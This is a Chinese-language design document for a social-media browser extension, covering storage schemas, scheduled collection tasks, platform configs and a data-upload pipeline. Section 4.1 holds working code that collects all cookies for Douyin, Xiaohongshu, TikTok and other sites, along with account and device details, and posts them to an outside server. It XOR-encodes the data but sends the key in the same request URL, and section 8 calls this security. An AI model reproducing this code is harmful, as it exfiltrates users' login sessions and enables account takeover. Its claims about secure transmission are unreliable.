# 社媒助手 - 数据结构设计文档

## 📊 数据架构总览

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                           数据存储架构分层                                    │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │                        Chrome Storage API                           │   │
│  │  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐              │   │
│  │  │ chrome.storage│  │ chrome.storage│  │ chrome.alarms│              │   │
│  │  │    .local    │  │   .session   │  │              │              │   │
│  │  └──────────────┘  └──────────────┘  └──────────────┘              │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                              │                                              │
│                              ▼                                              │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │                      WXT Storage 封装层                              │   │
│  │  ┌─────────────────┐  ┌─────────────────┐  ┌─────────────────┐     │   │
│  │  │  defineItem()   │  │  defineItem()   │  │  defineItem()   │     │   │
│  │  │  local:xxx      │  │  session:xxx    │  │  sync:xxx       │     │   │
│  │  └─────────────────┘  └─────────────────┘  └─────────────────┘     │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                              │                                              │
│                              ▼                                              │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │                        应用数据模型                                  │   │
│  │  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐  │   │
│  │  │ TaskAlarm│ │LastCollect│ │ DeviceId │ │Platform  │ │ Account  │  │   │
│  │  │          │ │   Time   │ │          │ │  Config  │ │   Info   │  │   │
│  │  └──────────┘ └──────────┘ └──────────┘ └──────────┘ └──────────┘  │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 一、存储类型定义

### 1.1 存储命名空间

| 命名空间 | 存储类型 | 生命周期 | 用途 |
|----------|----------|----------|------|
| `local:*` | chrome.storage.local | 持久化 | 长期配置、任务列表 |
| `session:*` | chrome.storage.session | 会话级 | 临时状态、缓存数据 |
| `sync:*` | chrome.storage.sync | 跨设备同步 | 用户配置（未使用） |

### 1.2 存储项定义方式

```javascript
// WXT 框架提供的 defineItem API
const storageItem = defineItem("namespace:key", {
  fallback: defaultValue,  // 默认值
  version: 1,              // 版本号（用于迁移）
});

// 使用示例
const taskAlarms = defineItem("local:taskAlarms", {
  fallback: []
});

const lastCollectTime = defineItem("session:lastCollectTime", {
  fallback: {}
});
```

---

## 二、核心数据模型

### 2.1 定时任务存储 (local:taskAlarms)

**用途：** 存储用户创建的自动化采集任务

```typescript
interface TaskAlarm {
  id: string;                    // 任务唯一标识
  name: string;                  // 任务名称
  platform: PlatformCode;        // 目标平台代码
  enabled: boolean;              // 是否启用
  when?: number;                 // 首次执行时间戳
  delayInMinutes?: number;       // 延迟执行分钟数
  periodInMinutes?: number;      // 周期执行间隔（分钟）
  createdAt: number;             // 创建时间戳
}

// 存储结构
{
  "local:taskAlarms": TaskAlarm[]
}
```

**示例数据：**

```json
{
  "taskAlarms": [
    {
      "id": "task_001",
      "name": "每日小红书采集",
      "platform": "xiaohongshu",
      "enabled": true,
      "when": 1704067200000,
      "periodInMinutes": 1440,
      "createdAt": 1703980800000
    },
    {
      "id": "task_002",
      "name": "抖音定时任务",
      "platform": "douyin",
      "enabled": false,
      "when": 1704153600000,
      "delayInMinutes": 60,
      "createdAt": 1704067200000
    }
  ]
}
```

**CRUD 操作：**

```javascript
// 创建任务
const createTask = async (task) => {
  const tasks = await taskAlarms.getValue();
  tasks.unshift(task);
  await taskAlarms.setValue(tasks);
  
  // 同步创建 Chrome Alarm
  if (task.enabled) {
    await chrome.alarms.create(task.id, {
      periodInMinutes: task.periodInMinutes,
      delayInMinutes: task.delayInMinutes,
      when: task.when
    });
  }
};

// 更新任务
const updateTask = async (taskId, updates) => {
  const tasks = await taskAlarms.getValue();
  tasks.forEach(task => {
    if (task.id === taskId) {
      Object.assign(task, updates);
    }
  });
  await taskAlarms.setValue(tasks);
};

// 删除任务
const deleteTask = async (taskId) => {
  const tasks = await taskAlarms.getValue();
  await taskAlarms.setValue(tasks.filter(t => t.id !== taskId));
  await chrome.alarms.clear(taskId);
};
```

---

### 2.2 采集时间记录 (session:lastCollectTime)

**用途：** 记录各平台最后一次采集时间，用于频率控制

```typescript
interface LastCollectTime {
  [platformCode: string]: number;  // 平台代码: 时间戳
}

// 存储结构
{
  "session:lastCollectTime": LastCollectTime
}
```

**示例数据：**

```json
{
  "lastCollectTime": {
    "xiaohongshu": 1704067200000,
    "douyin": 1704063600000,
    "kuaishou": 1704052800000,
    "tiktok": 1704049200000
  }
}
```

**频率检查逻辑：**

```javascript
const COLLECT_COOLDOWN = 3600 * 1000; // 1小时（毫秒）

const canCollect = async (platformCode) => {
  const records = await lastCollectTime.getValue();
  const lastTime = records[platformCode];
  
  if (!lastTime) return true;
  
  return Date.now() - lastTime >= COLLECT_COOLDOWN;
};

const recordCollectTime = async (platformCode) => {
  const records = await lastCollectTime.getValue();
  records[platformCode] = Date.now();
  await lastCollectTime.setValue(records);
};
```

---

### 2.3 设备标识存储 (local:deviceId)

**用途：** 存储唯一设备标识，用于数据追踪

```typescript
// 存储结构
{
  "local:deviceId": string  // UUID 格式
}
```

**生成逻辑：**

```javascript
const getOrCreateDeviceId = async () => {
  let deviceId = await deviceIdStorage.getValue();
  
  if (!deviceId) {
    // 生成 16 位随机十六进制字符串
    deviceId = Array.from({ length: 16 }, () => 
      'abcdef0123456789'[Math.floor(Math.random() * 16)]
    ).join('');
    
    await deviceIdStorage.setValue(deviceId);
  }
  
  return deviceId;
};
```

---

### 2.4 蒲公英白名单状态 (session:pgyWhitelist)

**用途：** 记录蒲公英平台白名单验证状态

```typescript
// 存储结构
{
  "session:pgyWhitelist": boolean
}
```

**验证逻辑：**

```javascript
const whiteListUserIds = [
  "5ebb50b0000000000101d586",
  "5e742ff700000000010059c9",
  "61e670350000000010005938",
  "5dcd4d2f000000000100afb2",
  "5fa81333000000000100b1a0",
  "566edaffe4251d3d9b5732fb",
  "5fa6b524000000000100bb16"
];

const whiteListCompanies = [
  "云智达创科技",
  "行吟信息科技",
  "小红书科技",
  "薯一薯二"
];

const checkWhitelist = async (userId, companyName) => {
  const isWhitelisted = whiteListUserIds.includes(userId) ||
    whiteListCompanies.some(company => companyName?.includes(company));
  
  if (isWhitelisted) {
    await pgyWhitelist.setValue(true);
  }
  
  return isWhitelisted;
};
```

---

## 三、平台配置数据

### 3.1 平台配置表

**用途：** 定义支持的社交媒体平台配置

```typescript
interface PlatformConfig {
  code: PlatformCode;      // 平台代码
  name: string;            // 平台名称
  hidden: boolean;         // 是否在UI中隐藏
  origin: string;          // 平台域名
  icon: string;            // 图标路径
}

type PlatformCode = 
  | "xiaohongshu"      // 小红书
  | "douyin"           // 抖音
  | "kuaishou"         // 快手
  | "tiktok"           // TikTok
  | "xingtu"           // 星图
  | "pgy.xiaohongshu"; // 蒲公英
```

**平台配置数据：**

```javascript
const platforms = [
  {
    code: "douyin",
    name: "抖音",
    hidden: false,
    origin: "https://www.douyin.com",
    icon: "/assets/douyin.svg"
  },
  {
    code: "xiaohongshu",
    name: "小红书",
    hidden: false,
    origin: "https://www.xiaohongshu.com",
    icon: "/assets/xiaohongshu.svg"
  },
  {
    code: "kuaishou",
    name: "快手",
    hidden: false,
    origin: "https://www.kuaishou.com",
    icon: "/assets/kuaishou.svg"
  },
  {
    code: "tiktok",
    name: "TikTok",
    hidden: false,
    origin: "https://www.tiktok.com",
    icon: "/assets/tiktok.svg"
  },
  {
    code: "xingtu",
    name: "星图",
    hidden: true,
    origin: "https://www.xingtu.com",
    icon: "/assets/xingtu.svg"
  },
  {
    code: "pgy.xiaohongshu",
    name: "蒲公英",
    hidden: true,
    origin: "https://pgy.xiaohongshu.com",
    icon: "/assets/pgy.xiaohongshu.svg"
  }
];
```

---

## 四、采集数据结构

### 4.1 采集请求数据

**用途：** 定义采集上报的数据结构

```typescript
interface CollectPayload {
  account: AccountInfo;           // 账号信息
  deviceId: string;               // 设备ID
  cookies: Cookie[];              // Cookie 数据
  version: string;                // 扩展版本
  platform: PlatformCode;         // 平台代码
  cpuArch: string;                // CPU架构
  osName: string;                 // 操作系统
}

interface AccountInfo {
  userId?: string;                // 用户ID
  userName?: string;              // 用户名
  companyName?: string;           // 公司名称
  // ... 其他账号相关字段
}

interface Cookie {
  name: string;
  value: string;
  domain: string;
  path: string;
  // ... Chrome Cookie 对象字段
}
```

**数据加密流程：**

```javascript
class XorEncryptor {
  constructor() {
    this.key = this.generateRandomKey(16);
  }

  generateRandomKey(length) {
    const array = new Uint8Array(length);
    crypto.getRandomValues(array);
    return array;
  }

  encrypt(text) {
    const encoder = new TextEncoder();
    const data = encoder.encode(text);
    const encrypted = new Uint8Array(data.length);
    
    for (let i = 0; i < data.length; i++) {
      encrypted[i] = data[i] ^ this.key[i % this.key.length];
    }
    
    return encrypted;
  }

  getHexKey() {
    return Array.from(this.key)
      .map(b => b.toString(16).padStart(2, '0'))
      .join('');
  }
}

// 采集数据加密上传
const collectAndUpload = async (accountInfo, sender) => {
  const platform = getPlatformCode(sender.url);
  const cookies = await chrome.cookies.getAll({ url: sender.url });
  const deviceId = await getDeviceId();
  const platformInfo = await chrome.runtime.getPlatformInfo();
  
  const payload = {
    account: accountInfo,
    deviceId,
    cookies,
    version: chrome.runtime.getManifest().version,
    platform,
    cpuArch: platformInfo.arch,
    osName: platformInfo.os
  };
  
  const encryptor = new XorEncryptor();
  const encrypted = encryptor.encrypt(JSON.stringify(payload));
  const key = encryptor.getHexKey();
  
  await fetch(`https://smzs.xisence.com/api/collect?key=${key}&timestamp=${Date.now()}`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/octet-stream',
      'x-version': payload.version,
      'x-platform': payload.platform,
      'x-device-id': payload.deviceId
    },
    body: encrypted
  });
};
```

---

## 五、运行时数据结构

### 5.1 消息通信结构

**用途：** 扩展各组件间的通信消息格式

```typescript
interface Message {
  id: number;           // 消息ID
  type: string;         // 消息类型
  data: any;            // 消息数据
  timestamp: number;    // 时间戳
}

// 消息类型定义
type MessageType =
  | "openSidepanel"     // 打开侧边栏
  | "executeScript"     // 执行脚本
  | "chrome"            // Chrome API 代理
  | "fetch"             // 网络请求
  | "upload"            // 文件上传
  | "collect"           // 数据采集
  | "response"          // 响应数据
  | "taskAlarm";        // 定时任务
```

### 5.2 拦截的请求数据结构

**用途：** 存储拦截的平台 API 请求数据

```typescript
interface InterceptedRequest {
  url: string;          // 请求URL
  method: string;       // 请求方法
  body?: any;           // 请求体
  result: any;          // 响应结果
  timestamp: number;    // 拦截时间
}

// 存储在内存中的拦截数据
const interceptedRequests: InterceptedRequest[] = [];
```

---

## 六、数据关系图

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                              数据实体关系图                                  │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  ┌──────────────┐         ┌──────────────┐         ┌──────────────┐        │
│  │   Platform   │◀───────▶│  TaskAlarm   │◀───────▶│   Account    │        │
│  │   Config     │  1:N    │              │  N:1    │    Info      │        │
│  └──────────────┘         └──────────────┘         └──────────────┘        │
│         │                        │                      │                  │
│         │                        │                      │                  │
│         ▼                        ▼                      ▼                  │
│  ┌──────────────┐         ┌──────────────┐         ┌──────────────┐        │
│  │   Collect    │         │ Chrome Alarm │         │   Device     │        │
│  │   Payload    │         │              │         │     Id       │        │
│  └──────────────┘         └──────────────┘         └──────────────┘        │
│         │                        │                      │                  │
│         │                        │                      │                  │
│         ▼                        ▼                      ▼                  │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │                        Remote API Server                            │   │
│  │                    https://smzs.xisence.com                         │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 七、数据持久化策略

### 7.1 存储对比

| 存储类型 | 容量限制 | 同步能力 | 适用场景 |
|----------|----------|----------|----------|
| chrome.storage.local | 10MB | 本地 | 任务列表、设备ID |
| chrome.storage.session | 10MB | 会话级 | 采集时间、临时状态 |
| chrome.storage.sync | 100KB | 跨设备 | 用户配置（未使用） |
| localStorage | 5MB | 无 | 页面级缓存 |
| IndexedDB | 较大 | 无 | 大数据存储（未使用） |

### 7.2 数据备份与恢复

```javascript
// 导出所有数据
const exportAllData = async () => {
  const data = {
    taskAlarms: await taskAlarms.getValue(),
    deviceId: await deviceIdStorage.getValue(),
    lastCollectTime: await lastCollectTime.getValue(),
    exportTime: Date.now()
  };
  
  return JSON.stringify(data, null, 2);
};

// 导入数据
const importAllData = async (jsonString) => {
  const data = JSON.parse(jsonString);
  
  if (data.taskAlarms) {
    await taskAlarms.setValue(data.taskAlarms);
  }
  if (data.deviceId) {
    await deviceIdStorage.setValue(data.deviceId);
  }
  if (data.lastCollectTime) {
    await lastCollectTime.setValue(data.lastCollectTime);
  }
};
```

---

## 八、数据安全设计

### 8.1 敏感数据处理

| 数据类型 | 处理方式 | 说明 |
|----------|----------|------|
| Cookies | 加密上传 | XOR 加密后传输 |
| 设备ID | 本地存储 | 随机生成，不关联用户 |
| 账号信息 | 加密上传 | 随采集数据一起加密 |
| 任务配置 | 本地存储 | 明文存储在本地 |

### 8.2 加密密钥管理

```javascript
// 每次采集生成新的随机密钥
const generateSessionKey = () => {
  const key = new Uint8Array(16);
  crypto.getRandomValues(key);
  return key;
};

// 密钥随请求发送（十六进制形式）
// 服务器使用相同密钥解密数据
```

---

*文档生成时间: 2026-02-06*
